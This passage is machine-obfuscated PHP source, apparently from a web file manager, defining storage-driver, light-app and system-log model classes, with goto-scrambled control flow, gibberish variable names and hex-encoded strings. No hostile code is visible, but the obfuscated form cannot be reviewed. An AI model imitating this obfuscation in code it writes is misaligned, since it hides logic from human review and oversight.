fÄá¯‚Æ´ª; aÉõµº¹Î: $E»íİ÷ÑœÅ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a§‡ÕÜ‹”ä = Model($E»íİ÷ÑœÅ[759])->where(array($E»íİ÷ÑœÅ[450] => $C¨ï‰¹Šğ))->field($E»íİ÷ÑœÅ[399])->select(); $AÚ÷Ø¯¤’Ê = array_to_keyvalue($a§‡ÕÜ‹”ä, $E»íİ÷ÑœÅ[33], $E»íİ÷ÑœÅ[399]); goto f–Ë¾ÚÅ´; EÁ¸‰ŒÍÉˆ: } private function shareFileMeta($e“™æ°º„ê, $dÙÌ‰ÄíÅ‘ = null) { $eÉ†Œï†é =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BáªÌã¬÷± = array($eÉ†Œï†é[450] => $e“™æ°º„ê, $eÉ†Œï†é[102] => $eÉ†Œï†é[1816]); if (is_null($dÙÌ‰ÄíÅ‘)) { return Model($eÉ†Œï†é[1817])->where($BáªÌã¬÷±)->find(); } $BáªÌã¬÷±[$eÉ†Œï†é[380]] = $dÙÌ‰ÄíÅ‘; Model($eÉ†Œï†é[1817])->add($BáªÌã¬÷±, array(), !0); } } goto aÈÅ™Ş¾‹›; dãä¹ĞóÙ‡: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\163\x74\x6f\x72\x61\147\145\x4c\151\x73\164"; public $field = array("\156\141\155\145", "\163\151\x7a\x65\115\141\170", "\163\x79\x73\164\x65\x6d", "\144\145\146\141\x75\154\x74", "\x64\162\x69\166\145\162", "\x63\x6f\156\146\x69\x67"); public function listData($B´ï‘Ü–É• = false, $e³Öà¯òÖê = "\x6d\157\x64\x69\146\x79\x54\x69\x6d\145", $C£±Ãó‡— = false) { $bÈéÀ†ÂºÇ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $a•Ó«Ùìã = parent::listData($B´ï‘Ü–É•, $e³Öà¯òÖê, $C£±Ãó‡—); if ($B´ï‘Ü–É•) { return $a•Ó«Ùìã; } $D”°™Ñœ™ç = $this->ioSizeUseGet(array_to_keyvalue($a•Ó«Ùìã, $bÈéÀ†ÂºÇ[33], $bÈéÀ†ÂºÇ[397])); foreach ($a•Ó«Ùìã as $e‹Ó§ÚŒåÉ => $c‡äÃÈŞÎÈ) { unset($a•Ó«Ùìã[$e‹Ó§ÚŒåÉ][$bÈéÀ†ÂºÇ[6]]); $a•Ó«Ùìã[$e‹Ó§ÚŒåÉ][$bÈéÀ†ÂºÇ[1636]] = isset($D”°™Ñœ™ç[$c‡äÃÈŞÎÈ[$bÈéÀ†ÂºÇ[397]]]) ? $D”°™Ñœ™ç[$c‡äÃÈŞÎÈ[$bÈéÀ†ÂºÇ[397]]] : 0; } return $a•Ó«Ùìã; } public function ioSizeUseGet($aùÖ¼Ô³ó‹) { goto C¶ƒ‘ÜÖ—Ï; CÑ™§·Æª£: $a¯©³Ãùà¶ = array($Cõ„ÉšÌ…¸[752] => array($Cõ„ÉšÌ…¸[7], $aùÖ¼Ô³ó‹)); $F¯œ±™© = Model($Cõ„ÉšÌ…¸[723])->field($a‘Ò¾¬»áÄ)->where($a¯©³Ãùà¶)->group($Cõ„ÉšÌ…¸[752])->select(); $F¯œ±™© = array_to_keyvalue($F¯œ±™©, $Cõ„ÉšÌ…¸[397], $Cõ„ÉšÌ…¸[87]); goto D‘¹±×½Ù; Dè¨ç­µÜˆ: $F¯œ±™© = Cache::get($fËøªêĞ¹); if ($F¯œ±™©) { return $F¯œ±™©; } $a‘Ò¾¬»áÄ = array($Cõ„ÉšÌ…¸[752] => $Cõ„ÉšÌ…¸[397], $Cõ„ÉšÌ…¸[1951] => $Cõ„ÉšÌ…¸[87]); goto CÑ™§·Æª£; C¶ƒ‘ÜÖ—Ï: $Cõ„ÉšÌ…¸ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$aùÖ¼Ô³ó‹) { return array(); } $fËøªêĞ¹ = $Cõ„ÉšÌ…¸[1950] . implode($Cõ„ÉšÌ…¸[47], $aùÖ¼Ô³ó‹); goto Dè¨ç­µÜˆ; D‘¹±×½Ù: Cache::set($fËøªêĞ¹, $F¯œ±™©, 60); return $F¯œ±™©; goto f„ó×’¶Å; f„ó×’¶Å: } public function getConfig($c©ëÅÅ—ê) { $E–™âÜ®ºç = parent::listData($c©ëÅÅ—ê); return json_decode($E–™âÜ®ºç[$_SERVER[í¤âËÚ£¶íÊ¢][6]], !0); } public function update($aè‘áõÂÃê, $A˜™ø‰ç¯‘) { goto B…Á×Äî¸ß; D”’ë°ìè: if (isset($bÏ®Ç©¡[$aÎøéµò¹»]) && $bÏ®Ç©¡[$aÎøéµò¹»][$a„¤‡ÀÍĞ¿[397]] != $aè‘áõÂÃê) { return !1; } if (isset($A˜™ø‰ç¯‘[$a„¤‡ÀÍĞ¿[1952]]) && $A˜™ø‰ç¯‘[$a„¤‡ÀÍĞ¿[1952]] == $a„¤‡ÀÍĞ¿[96]) { $this->checkConfig($A˜™ø‰ç¯‘); } unset($A˜™ø‰ç¯‘[$a„¤‡ÀÍĞ¿[1952]]); goto b†‰ø²‚íº; b†‰ø²‚íº: $eÅïôğº“Û = parent::update($aè‘áõÂÃê, $A˜™ø‰ç¯‘); if ($eÅïôğº“Û && $A˜™ø‰ç¯‘[$a„¤‡ÀÍĞ¿[34]]) { foreach ($bÏ®Ç©¡ as $CòäÈÉÎ‰Í) { if ($CòäÈÉÎ‰Í[$a„¤‡ÀÍĞ¿[34]] && $CòäÈÉÎ‰Í[$a„¤‡ÀÍĞ¿[397]] != $aè‘áõÂÃê) { parent::update($CòäÈÉÎ‰Í[$a„¤‡ÀÍĞ¿[397]], array($a„¤‡ÀÍĞ¿[34] => 0)); } } } return $eÅïôğº“Û; goto a´Úç—Ä•; B…Á×Äî¸ß: $a„¤‡ÀÍĞ¿ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aÎøéµò¹» = $A˜™ø‰ç¯‘[$a„¤‡ÀÍĞ¿[28]]; $bÏ®Ç©¡ = array_to_keyvalue(parent::listData(), $a„¤‡ÀÍĞ¿[28]); goto D”’ë°ìè; a´Úç—Ä•: } public function add($c•œù¿±âÙ) { goto e¾«ŒÄ¹†¦; BÎÙ°ùâ†ß: return $C´„Ü÷Æè«; goto C•âĞÅ£Øİ; e¾«ŒÄ¹†¦: $FÃÄˆÓô‚¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c¬¼Â‰šÕá = array_to_keyvalue(parent::listData(), $FÃÄˆÓô‚¹[28]); if (isset($c¬¼Â‰šÕá[$c•œù¿±âÙ[$FÃÄˆÓô‚¹[28]]])) { return !1; } goto Fî‡Ğ¬ğ; Fî‡Ğ¬ğ: $this->checkConfig($c•œù¿±âÙ); $C´„Ü÷Æè« = parent::insert($c•œù¿±âÙ); if ($C´„Ü÷Æè« && $c•œù¿±âÙ[$FÃÄˆÓô‚¹[34]]) { foreach ($c¬¼Â‰šÕá as $AèÅÁëöİö) { if ($AèÅÁëöİö[$FÃÄˆÓô‚¹[34]]) { parent::update($AèÅÁëöİö[$FÃÄˆÓô‚¹[397]], array($FÃÄˆÓô‚¹[34] => 0)); } } } goto BÎÙ°ùâ†ß; C•âĞÅ£Øİ: } public function checkConfig(&$còëæêíÛ¨) { goto d¸”Õˆî–; Dºõø™‡ä: $CæÀéä‰§° = new $Aõ¸ß·É³ô($C¨ñâÒ‡è‚); if (in_array($e±ÌÃë¹”Ä, $CæÀéä‰§°->objectDriver)) { if (!$CæÀéä‰§°->isBucketCors() && !$CæÀéä‰§°->setBucketCors()) { $Bß˜–‚º = LNG($c×Á¬ÖŒ†[1957]); $Bß˜–‚º .= $c×Á¬ÖŒ†[1958] . LNG($c×Á¬ÖŒ†[1959]); show_json($Bß˜–‚º, !1); } } $F¡–«õ½Ë = rtrim($C¨ñâÒ‡è‚[$c×Á¬ÖŒ†[1036]], $c×Á¬ÖŒ†[8]) . $c×Á¬ÖŒ†[8]; goto c’ì—ÃÒ; d¸”Õˆî–: $c×Á¬ÖŒ† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e±ÌÃë¹”Ä = strtolower($còëæêíÛ¨[$c×Á¬ÖŒ†[103]]); $C¨ñâÒ‡è‚ = json_decode($còëæêíÛ¨[$c×Á¬ÖŒ†[6]], !0); goto dÖ­‚å‰èİ; dÖ­‚å‰èİ: foreach ($C¨ñâÒ‡è‚ as $FĞ™ÈÎ¼ => $c¼éÕÄ›ÌÒ) { $C¨ñâÒ‡è‚[$FĞ™ÈÎ¼] = trim($c¼éÕÄ›ÌÒ); } $C¨ñâÒ‡è‚[$c×Á¬ÖŒ†[1953]] = rand_string(6); $FŸõ¬³ì½æ = $GLOBALS[$c×Á¬ÖŒ†[6]][$c×Á¬ÖŒ†[97]][$c×Á¬ÖŒ†[760]]; goto AÓÇÎ‡·­é; bÔ†ÖöïÅ”: $còëæêíÛ¨[$c×Á¬ÖŒ†[6]] = json_encode($C¨ñâÒ‡è‚); $còëæêíÛ¨[$c×Á¬ÖŒ†[103]] = $EÑä”‘Ò–; return !0; goto DôéÙë±·œ; AÓÇÎ‡·­é: $EÑä”‘Ò– = isset($FŸõ¬³ì½æ[$e±ÌÃë¹”Ä]) ? $FŸõ¬³ì½æ[$e±ÌÃë¹”Ä] : ucfirst($e±ÌÃë¹”Ä); $Aõ¸ß·É³ô = $c×Á¬ÖŒ†[81] . $EÑä”‘Ò–; if (!$EÑä”‘Ò– || !class_exists($Aõ¸ß·É³ô)) { write_log(array($c×Á¬ÖŒ†[1954], $còëæêíÛ¨, get_caller_info()), $c×Á¬ÖŒ†[1955]); show_json(LNG($c×Á¬ÖŒ†[1956]), !1, $còëæêíÛ¨); } goto Dºõø™‡ä; c’ì—ÃÒ: $C•¬Â«Ûé­ = $CæÀéä‰§°->getPath($F¡–«õ½Ë . $c×Á¬ÖŒ†[1097]); if (!$CæÀéä‰§°->mkfile($C•¬Â«Ûé­)) { show_json(LNG($c×Á¬ÖŒ†[1957]), !1); } $C¨ñâÒ‡è‚[$c×Á¬ÖŒ†[1036]] = $F¡–«õ½Ë; goto bÔ†ÖöïÅ”; DôéÙë±·œ: } public function driverListSystem() { $BšÙÆÄ„ó =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DîˆÒ©ÅÑæ = parent::listData(); $f“¶¬öİ® = array(); foreach ($DîˆÒ©ÅÑæ as $B¼â¬™ØĞµ) { unset($B¼â¬™ØĞµ[$BšÙÆÄ„ó[202]], $B¼â¬™ØĞµ[$BšÙÆÄ„ó[93]]); $B¼â¬™ØĞµ[$BšÙÆÄ„ó[6]] = json_decode($B¼â¬™ØĞµ[$BšÙÆÄ„ó[6]], !0); $f“¶¬öİ®[] = $B¼â¬™ØĞµ; } return $f“¶¬öİ®; } public function defaultDriver() { $F„µÚƒèÙØ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Cç†à·ƒğÖ = parent::listData(); $Eã—”Ë«– = array_filter_by_field($Cç†à·ƒğÖ, $F„µÚƒèÙØ[34], 1); $Eã—”Ë«– = $Eã—”Ë«–[0]; if ($Eã—”Ë«–) { $Eã—”Ë«–[$F„µÚƒèÙØ[6]] = json_decode($Eã—”Ë«–[$F„µÚƒèÙØ[6]], !0); } return $Eã—”Ë«–; } public function driverInfo($eîĞãëöƒ¸) { $A±©‹¸¶À¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A™­¡¼–‘Â = array_to_keyvalue(parent::listData(), $A±©‹¸¶À¹[397]); if (!isset($A™­¡¼–‘Â[$eîĞãëöƒ¸])) { return !1; } $Cºß´ŒˆÌ = $A™­¡¼–‘Â[$eîĞãëöƒ¸]; $Cºß´ŒˆÌ[$A±©‹¸¶À¹[6]] = json_decode($Cºß´ŒˆÌ[$A±©‹¸¶À¹[6]], !0); return $Cºß´ŒˆÌ; } public function remove($fºëó¨Øà) { $this->removeShareItems($fºëó¨Øà); return parent::remove($fºëó¨Øà); } public function removeWithFile($f¡íßé–™ò, $d«¿áØŒ³) { goto cÃ¦Å˜Û; eìß²ùÛª: $FÁ–‚Ã…ó = Model($B™¨ç¨§èš[453])->where($fØ÷´Æ·¬)->sum($B™¨ç¨§èš[87]); $BÍîÄŠ«é³ = $d«¿áØŒ³ . $B™¨ç¨§èš[1960] . $f¡íßé–™ò; $fˆ²Ìêàå = new TaskFileTransfer($BÍîÄŠ«é³, $B™¨ç¨§èš[1955], $D…‡·É¼”ª, LNG($B™¨ç¨§èš[1961]) . "\50{$f¡íßé–™ò}\x29"); goto E¶¦ï¤“‹; cÃ¦Å˜Û: $B™¨ç¨§èš =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fØ÷´Æ·¬ = array($B™¨ç¨§èš[752] => $f¡íßé–™ò); $D…‡·É¼”ª = Model($B™¨ç¨§èš[453])->where($fØ÷´Æ·¬)->count(); goto eìß²ùÛª; A¶ÁÀºµñ¯: if (!$AªïæàÇ»») { $fˆ²Ìêàå->stop($BÍîÄŠ«é³); return !1; } $fˆ²Ìêàå->end(); if ($d«¿áØŒ³ == $B™¨ç¨§èš[1616]) { $this->remove($f¡íßé–™ò); } goto b‹‹„È; BŠçºˆº›: $A‹»ª°š¸° = "\173\x69\x6f\72{$Ağ¾Á®Æ«µ}\175\57"; $AªïæàÇ»» = !0; $CÑ¡ãî‚Õ¦ = array(); goto a¹ëÑ’ °; a¹ëÑ’ °: $a–ÄÀï“Ä = Model($B™¨ç¨§èš[201])->where($fØ÷´Æ·¬)->field($B™¨ç¨§èš[1962])->select(); foreach ($a–ÄÀï“Ä as $aíÌø– ˜) { goto e¥ÄŸ“ƒÊÏ; aŞùª½Û†: $cô³ë÷ŸÒ÷ = array($B™¨ç¨§èš[752] => $Ağ¾Á®Æ«µ, $B™¨ç¨§èš[85] => $BğïøŠá); Model($B™¨ç¨§èš[201])->where($fØ÷´Æ·¬)->save($cô³ë÷ŸÒ÷); goto dŒ›Ê°óç•; e¥ÄŸ“ƒÊÏ: $aÇ „§ò‘– = $aíÌø– ˜[$B™¨ç¨§èš[85]]; $BğïøŠá = $A‹»ª°š¸° . str_replace("\173\x69\157\72{$f¡íßé–™ò}\175\x2f", $B™¨ç¨§èš[33], $aÇ „§ò‘–); if (!IO::exist($aÇ „§ò‘–)) { $CÑ¡ãî‚Õ¦[] = $aíÌø– ˜[$B™¨ç¨§èš[450]]; $fˆ²Ìêàå->updateFileEnd($aíÌø– ˜[$B™¨ç¨§èš[28]], $aíÌø– ˜[$B™¨ç¨§èš[87]]); continue; } goto DÍº½Ó–˜¢; DÍº½Ó–˜¢: if (IO::exist($BğïøŠá)) { $fˆ²Ìêàå->updateFileEnd($aíÌø– ˜[$B™¨ç¨§èš[28]], $aíÌø– ˜[$B™¨ç¨§èš[87]]); continue; } if (!IO::move($aÇ „§ò‘–, get_path_father($BğïøŠá))) { $AªïæàÇ»» = !1; break; } $fØ÷´Æ·¬ = array($B™¨ç¨§èš[450] => $aíÌø– ˜[$B™¨ç¨§èš[450]]); goto aŞùª½Û†; dŒ›Ê°óç•: } $this->removeByFileID($CÑ¡ãî‚Õ¦); goto A¶ÁÀºµñ¯; E¶¦ï¤“‹: $fˆ²Ìêàå->task[$B™¨ç¨§èš[703]] = (double) $FÁ–‚Ã…ó; $dã•×¦¹ÏÕ = KodIO::defaultDriver(); $Ağ¾Á®Æ«µ = $dã•×¦¹ÏÕ[$B™¨ç¨§èš[397]]; goto BŠçºˆº›; b‹‹„È: } public function progress($dˆğ·‰ÅÅŒ, $b£Í˜‹‰–) { return Task::get($b£Í˜‹‰– . $_SERVER[í¤âËÚ£¶íÊ¢][1960] . $dˆğ·‰ÅÅŒ); } private function removeByFileID($CÌÏˆŸ¯¢Ç = array()) { goto eó§ğÂÔÏç; eó§ğÂÔÏç: $B“ÇÔ¸„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($CÌÏˆŸ¯¢Ç)) { return; } $eÙºêÎ¹‡ = array($B“ÇÔ¸„[450] => array($B“ÇÔ¸„[7], $CÌÏˆŸ¯¢Ç)); goto Fß›Èº¨; Fß›Èº¨: $a»×Æ¾¡ğ¶ = Model($B“ÇÔ¸„[1164])->where($eÙºêÎ¹‡)->field($B“ÇÔ¸„[399])->select(); if (!$a»×Æ¾¡ğ¶) { return; } $a»×Æ¾¡ğ¶ = array_to_keyvalue($a»×Æ¾¡ğ¶, $B“ÇÔ¸„[33], $B“ÇÔ¸„[399]); goto bº‡±Ÿ°—£; bº‡±Ÿ°—£: foreach ($a»×Æ¾¡ğ¶ as $f¶…„‰»Äø) { Model($B“ÇÔ¸„[412])->removeNow($f¶…„‰»Äø, !1); } goto Fì‘êİ¦ğ; Fì‘êİ¦ğ: } private function removeShareItems($câø›Æºê“) { goto céöğİ»äÔ; céöğİ»äÔ: $bŒ‘†›’Û =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÛõÖ–¡ŒŒ = "\173\x69\x6f\x3a{$câø›Æºê“}\x7d\57"; $DÌŸĞ·¼ñ = array($bŒ‘†›’Û[399] => 0, $bŒ‘†›’Û[1031] => array($bŒ‘†›’Û[387], "{$eÛõÖ–¡ŒŒ}\45")); goto aäÇ½ô’ÇŞ; d¸Ç÷ß¡Î: Model($bŒ‘†›’Û[567])->remove($Bé¡·“¡‚Ñ); goto bš½äÄñ ¹; aäÇ½ô’ÇŞ: $F‹õË»Òè = Model($bŒ‘†›’Û[1627])->where($DÌŸĞ·¼ñ)->field($bŒ‘†›’Û[471])->select(); if (empty($F‹õË»Òè)) { return; } $Bé¡·“¡‚Ñ = array_to_keyvalue($F‹õË»Òè, $bŒ‘†›’Û[33], $bŒ‘†›’Û[471]); goto d¸Ç÷ß¡Î; bš½äÄñ ¹: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\x2e\x4c\x69\147\x68\x74\x41\x70\160"; public $modelType = "\x53\171\163\x74\x65\x6d\117\x70\x74\x69\x6f\x6e"; public $field = array("\156\141\155\x65", "\147\x72\x6f\x75\160", "\x64\x65\163\x63", "\143\x6f\156\x74\x65\156\x74"); public function listData($aµéĞŒ¡é = false, $e‚œøÁöÌ = "\x6d\157\144\x69\x66\171\124\151\x6d\x65", $e­Î„šÚ³ = true) { return parent::listData($aµéĞŒ¡é, $e‚œøÁöÌ, $e­Î„šÚ³); } public function remove($dÜãÚï‡Ş) { $Fìåîñ¨ç’ = $this->findByName($dÜãÚï‡Ş); if (!$Fìåîñ¨ç’) { return !1; } return parent::remove($Fìåîñ¨ç’[$_SERVER[í¤âËÚ£¶íÊ¢][397]]); } public function add($DšÂï³âÙ) { if ($this->findByName($DšÂï³âÙ[$_SERVER[í¤âËÚ£¶íÊ¢][28]])) { return !1; } return parent::insert($DšÂï³âÙ); } public function update($cÌÑÊãÓì, $EÓ†õìÇÔ¼) { $dÁ²óÌ®¤œ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $B®‡Œ·Ë = $this->findByName($cÌÑÊãÓì); $dÜæŞ÷¹œ† = $this->findByName($EÓ†õìÇÔ¼[$dÁ²óÌ®¤œ[28]]); if (!$B®‡Œ·Ë || $dÜæŞ÷¹œ† && $dÜæŞ÷¹œ†[$dÁ²óÌ®¤œ[397]] != $B®‡Œ·Ë[$dÁ²óÌ®¤œ[397]]) { return !1; } return parent::update($B®‡Œ·Ë[$dÁ²óÌ®¤œ[397]], $EÓ†õìÇÔ¼); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\155\137\154\157\147"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\x54\151\x6d\145", "\164\x69\155\x65", "\151\x6e\x73\x65\x72\164", "\146\165\156\x63\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $f³ˆîåƒÄ½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return array($f³ˆîåƒÄ½[1963] => LNG($f³ˆîåƒÄ½[1964]), $f³ˆîåƒÄ½[1965] => LNG($f³ˆîåƒÄ½[1966]), $f³ˆîåƒÄ½[1590] => LNG($f³ˆîåƒÄ½[1967]), $f³ˆîåƒÄ½[1968] => LNG($f³ˆîåƒÄ½[1969]), $f³ˆîåƒÄ½[1970] => LNG($f³ˆîåƒÄ½[1971]), $f³ˆîåƒÄ½[1972] => LNG($f³ˆîåƒÄ½[1973]), $f³ˆîåƒÄ½[1974] => LNG($f³ˆîåƒÄ½[1975]), $f³ˆîåƒÄ½[1620] => LNG($f³ˆîåƒÄ½[1975]), $f³ˆîåƒÄ½[1621] => LNG($f³ˆîåƒÄ½[1976]), $f³ˆîåƒÄ½[1977] => LNG($f³ˆîåƒÄ½[1978]), $f³ˆîåƒÄ½[1979] => LNG($f³ˆîåƒÄ½[1980]), $f³ˆîåƒÄ½[1981] => LNG($f³ˆîåƒÄ½[1982]), $f³ˆîåƒÄ½[1983] => LNG($f³ˆîåƒÄ½[1984]), $f³ˆîåƒÄ½[1618] => LNG($f³ˆîåƒÄ½[1985]), $f³ˆîåƒÄ½[1625] => LNG($f³ˆîåƒÄ½[1986]), $f³ˆîåƒÄ½[1987] => LNG($f³ˆîåƒÄ½[1988]), $f³ˆîåƒÄ½[1989] => LNG($f³ˆîåƒÄ½[1990]), $f³ˆîåƒÄ½[1991] => LNG($f³ˆîåƒÄ½[1992]), $f³ˆîåƒÄ½[1993] => LNG($f³ˆîåƒÄ½[1994]), $f³ˆîåƒÄ½[1628] => LNG($f³ˆîåƒÄ½[1995]), $f³ˆîåƒÄ½[1629] => LNG($f³ˆîåƒÄ½[1996]), $f³ˆîåƒÄ½[1997] => LNG($f³ˆîåƒÄ½[1998]), $f³ˆîåƒÄ½[1999] => LNG($f³ˆîåƒÄ½[2000]), $f³ˆîåƒÄ½[2001] => LNG($f³ˆîåƒÄ½[2002]), $f³ˆîåƒÄ½[1623] => LNG($f³ˆîåƒÄ½[2003]), $f³ˆîåƒÄ½[2004] => LNG($f³ˆîåƒÄ½[2005]), $f³ˆîåƒÄ½[1622] => LNG($f³ˆîåƒÄ½[2006]), $f³ˆîåƒÄ½[2007] => LNG($f³ˆîåƒÄ½[2008]), $f³ˆîåƒÄ½[2009] => LNG($f³ˆîåƒÄ½[2010]), $f³ˆîåƒÄ½[2011] => LNG($f³ˆîåƒÄ½[2012]), $f³ˆîåƒÄ½[2013] => LNG($f³ˆîåƒÄ½[2013]), $f³ˆîåƒÄ½[2014] => LNG($f³ˆîåƒÄ½[1594]), $f³ˆîåƒÄ½[2015] => LNG($f³ˆîåƒÄ½[2016]), $f³ˆîåƒÄ½[2017] => LNG($f³ˆîåƒÄ½[2018]), $f³ˆîåƒÄ½[2019] => LNG($f³ˆîåƒÄ½[2020]), $f³ˆîåƒÄ½[2021] => LNG($f³ˆîåƒÄ½[2022]), $f³ˆîåƒÄ½[2023] => LNG($f³ˆîåƒÄ½[2024]), $f³ˆîåƒÄ½[2025] => LNG($f³ˆîåƒÄ½[2025]), $f³ˆîåƒÄ½[2026] => LNG($f³ˆîåƒÄ½[2027]), $f³ˆîåƒÄ½[2028] => LNG($f³ˆîåƒÄ½[2029]), $f³ˆîåƒÄ½[2030] => LNG($f³ˆîåƒÄ½[2031]), $f³ˆîåƒÄ½[2032] => LNG($f³ˆîåƒÄ½[2033]), $f³ˆîåƒÄ½[2034] => LNG($f³ˆîåƒÄ½[2035]), $f³ˆîåƒÄ½[2036] => LNG($f³ˆîåƒÄ½[2037])); } private function typeFile() { $F¼ì“åŸÒÎ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $FÙœ«‹¼Û˜ = array($F¼ì“åŸÒÎ[1625] => array($F¼ì“åŸÒÎ[1626]), $F¼ì“åŸÒÎ[1981] => array($F¼ì“åŸÒÎ[2038]), $F¼ì“åŸÒÎ[1983] => array($F¼ì“åŸÒÎ[2039]), $F¼ì“åŸÒÎ[1618] => array($F¼ì“åŸÒÎ[1619]), $F¼ì“åŸÒÎ[1989] => array(), $F¼ì“åŸÒÎ[1991] => array(), $F¼ì“åŸÒÎ[1993] => array(), $F¼ì“åŸÒÎ[1628] => array($F¼ì“åŸÒÎ[1630]), $F¼ì“åŸÒÎ[1629] => array($F¼ì“åŸÒÎ[1630]), $F¼ì“åŸÒÎ[1997] => array($F¼ì“åŸÒÎ[2040]), $F¼ì“åŸÒÎ[1999] => array($F¼ì“åŸÒÎ[2040]), $F¼ì“åŸÒÎ[2001] => array($F¼ì“åŸÒÎ[2041]), $F¼ì“åŸÒÎ[1987] => array($F¼ì“åŸÒÎ[2042]), $F¼ì“åŸÒÎ[1623] => array($F¼ì“åŸÒÎ[2043]), $F¼ì“åŸÒÎ[2004] => array($F¼ì“åŸÒÎ[2044]), $F¼ì“åŸÒÎ[1622] => array($F¼ì“åŸÒÎ[1624])); return $FÙœ«‹¼Û˜; } private function typeAll() { goto C³Õª§Ãø‰; c‰ñé»Ô: foreach ($B™‡‹‰±«ƒ as $C‚¬ä¥êÌ± => $E¸¯Œ¬¡Æ¼) { $aÛĞé¹ëææ[$E¸¯Œ¬¡Æ¼[0]] = $aÛĞé¹ëææ[$C‚¬ä¥êÌ±]; } $aÛĞé¹ëææ[$a‹§Ğºê±[1630]] = LNG($a‹§Ğºê±[2045]); $aÛĞé¹ëææ[$a‹§Ğºê±[2040]] = LNG($a‹§Ğºê±[2046]); goto AÄ¿ëÑ•Å; AÄ¿ëÑ•Å: return $aÛĞé¹ëææ; goto B®îÄ­•Š; C³Õª§Ãø‰: $a‹§Ğºê± =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aÛĞé¹ëææ = $this->typeList; $B™‡‹‰±«ƒ = array_filter($this->typeFile()); goto c‰ñé»Ô; B®îÄ­•Š: } public function addLog($BßÁºÇÓí, $B×¦âÙñÔ = array()) { goto FØ´Éß³½; E‚ÇÙ‡ê…Î: if (!$AÎäÎ¢Ä®¿) { $AÎäÎ¢Ä®¿ = (int) Session::get($eĞî·åÈíŒ[1777]); } $FÅ„ƒÂ‡‹ = get_client_ip(); if (!$B×¦âÙñÔ || strlen(json_encode($B×¦âÙñÔ)) >= 1024) { $B×¦âÙñÔ = array($eĞî·åÈíŒ[2047] => $FÅ„ƒÂ‡‹); } else { if (is_array($B×¦âÙñÔ)) { $B×¦âÙñÔ[$eĞî·åÈíŒ[2047]] = $FÅ„ƒÂ‡‹; } else { $B×¦âÙñÔ = array($eĞî·åÈíŒ[1048] => $B×¦âÙñÔ, $eĞî·åÈíŒ[2047] => $FÅ„ƒÂ‡‹); } } goto BäÛ—‰ˆ; FØ´Éß³½: $eĞî·åÈíŒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!isset($this->typeList[$BßÁºÇÓí])) { return; } $AÎäÎ¢Ä®¿ = defined($eĞî·åÈíŒ[457]) && USER_ID ? USER_ID : (isset($B×¦âÙñÔ[$eĞî·åÈíŒ[1487]]) ? $B×¦âÙñÔ[$eĞî·åÈíŒ[1487]] : 0); goto E‚ÇÙ‡ê…Î; BäÛ—‰ˆ: $B×¦âÙñÔ = array($eĞî·åÈíŒ[1478] => Session::sign(), $eĞî·åÈíŒ[1479] => $AÎäÎ¢Ä®¿, $eĞî·åÈíŒ[29] => $BßÁºÇÓí, $eĞî·åÈíŒ[1481] => json_encode($B×¦âÙñÔ)); parent::add($B×¦âÙñÔ); goto càœØ³è»à; càœØ³è»à: } public function remove($eÑğÁ†¦Ğğ) { $this->where(array($_SERVER[í¤âËÚ£¶íÊ¢][415] => $eÑğÁ†¦Ğğ))->delete(); } private function _makeOrder($A™ùÅÌíÄ¢ = '') { goto E¥÷ã±—Â; aŠàŠÅ¶“’: return $this->order($A™ùÅÌíÄ¢); goto f»ÛÜÎƒ…’; E¥÷ã±—Â: $B§‰‰†›ç =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Cµ¥ŒÈ¶Õà = $B§‰‰†›ç[202]; $AÕÒØŸ›øÌ = array($B§‰‰†›ç[431] => $B§‰‰†›ç[432], $B§‰‰†›ç[433] => $B§‰‰†›ç[434]); goto AÛ‰æø¹×‘; AÛ‰æø¹×‘: $F·“º’„Íò = Input::get($B§‰‰†›ç[439], $B§‰‰†›ç[7], $B§‰‰†›ç[1809], array($B§‰‰†›ç[1733], $B§‰‰†›ç[433])); $F·“º’„Íò = $AÕÒØŸ›øÌ[$F·“º’„Íò]; $A™ùÅÌíÄ¢ = $A™ùÅÌíÄ¢ . "{$Cµ¥ŒÈ¶Õà}\x20{$F·“º’„Íò}"; goto aŠàŠÅ¶“’; f»ÛÜÎƒ…’: } public function get($CãˆŒõ“† = '') { goto eÅ¦©¨¡é; eß¢è²«¾‡: $C°—Êßƒ¾‡[$F­ÎÖ¿½¦[375]] = $this->logList($C°—Êßƒ¾‡[$F­ÎÖ¿½¦[375]]); return $C°—Êßƒ¾‡; goto Eß¸²Í™”¢; eÅ¦©¨¡é: $F­ÎÖ¿½¦ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$CãˆŒõ“†) { show_json(array()); } $fÂÏ‚²â…¶ = array(); goto e‘‡ØÅ…Ùá; e‘‡ØÅ…Ùá: if ($CãˆŒõ“†[$F­ÎÖ¿½¦[1487]]) { $fÂÏ‚²â…¶[$F­ÎÖ¿½¦[1487]] = $CãˆŒõ“†[$F­ÎÖ¿½¦[1487]]; } if (isset($CãˆŒõ“†[$F­ÎÖ¿½¦[707]])) { $AÜ ³¥â = $CãˆŒõ“†[$F­ÎÖ¿½¦[707]]; $Fğµ¦äµëƒ = isset($CãˆŒõ“†[$F­ÎÖ¿½¦[479]]) ? $CãˆŒõ“†[$F­ÎÖ¿½¦[479]] : time(); $fÂÏ‚²â…¶[$F­ÎÖ¿½¦[202]] = array($F­ÎÖ¿½¦[338], 